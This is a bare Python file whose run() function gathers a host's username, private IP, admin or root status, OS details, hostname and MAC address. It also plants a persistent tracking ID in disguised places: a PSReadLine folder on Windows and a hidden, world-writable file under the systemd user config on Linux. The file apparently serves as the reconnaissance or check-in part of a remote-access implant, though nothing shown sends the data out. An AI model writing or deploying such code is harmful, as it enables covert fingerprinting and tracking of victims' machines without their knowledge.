import socket
import requests
import os
import platform
import getpass
import subprocess
from uuid import getnode as get_mac
import uuid
import os

def run(url):
    def get_uuid():
        if platform.system() == "Windows":
            user = getpass.getuser()
            if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt"):
                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt", "r") as f:
                    return f.read().strip()
            else:
                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt", "w") as f:
                    f.write(uuid_value)
                return uuid_value
                
        if platform.system() == "Linux":
            user = getpass.getuser()
            path = f"/home/{user}/.config/systemd/user/.system_uuid"
            if os.path.exists(path):
                with open(path, "r") as f:
                    return f.read().strip()
            else:
                subprocess.run(f'touch {path}', shell=True)
                os.chmod(path, 0o666)
                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
                with open(path, "w") as f:
                    f.write(uuid_value)
                return uuid_value
    
    def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            s.connect(("10.254.254.254", 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = "127.0.0.1"
        finally:
            s.close()
        return IP
    
    def is_admin():
        system = platform.system()
    
        try:
            if system == "Windows":
                # Windows: Check if the user is an admin
                result = subprocess.run("net session",
                                        shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                return result.returncode == 0
    
            elif system == "Linux" or system == "Darwin" or system == "FreeBSD" or system == "OpenBSD":
                # Unix-like systems: Check if the user is root
                return os.geteuid() == 0
    
            elif system == "SunOS":  # Solaris
                # Solaris: Check if the user is root
                return os.geteuid() == 0
    
            elif system == "Android":
                # Android: Check if the script is running as root
                # Android-specific method to check for root access
                result = subprocess.run("su -c 'id'",
                                        shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                return 'uid=0(root)' in result.stdout.decode()
    
            else:
                return False
    
        except Exception as e:
            print(f"Error checking admin privileges: {e}")
            return False
    
    
    # Get username
    username = getpass.getuser()
    
    # Get platform information
    platform_info = platform.uname()
    
    # Get OS version
    os_version = platform.platform()
    
    hostname = platform.node()
    
    mac = get_mac()
    
    data = {
        'private_ip': get_ip(),
        'username': username,
        'permissions': is_admin(),
        'platform': platform_info,
        'os_version': os_version,
        'hostname': hostname,
        'mac_address': mac,
        'uuid': get_uuid(),
        'url': url,
    
    }
    
    return data
